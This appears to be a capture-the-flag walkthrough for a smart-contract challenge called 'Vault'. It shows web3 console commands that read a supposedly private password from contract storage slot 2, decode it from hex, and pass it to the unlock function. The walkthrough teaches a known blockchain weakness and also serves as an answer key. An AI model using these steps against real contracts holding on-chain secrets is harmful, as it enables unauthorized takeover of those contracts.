# Vault

**HINT:** Your going to want to check the Storage of the instance address using web3 in the console
<details>
<summary>Answer</summary>
<p>

```js
await web3.eth.getStorageAt('Contract_Instance', 2, (err,res)=>{console.log(res)});
```
This results in a hex
```
"0x412076657279207374726f6e67207365637265742070617373776f7264203a29"
```
This is the password but you can see what it says by doing:
```js
await web3.utils.hexToAscii('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
```
Giving you:
```
"A very strong secret password :)"
```
Toss the password into the unlock function 
```js
await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```
Then click submit
</p>
</details>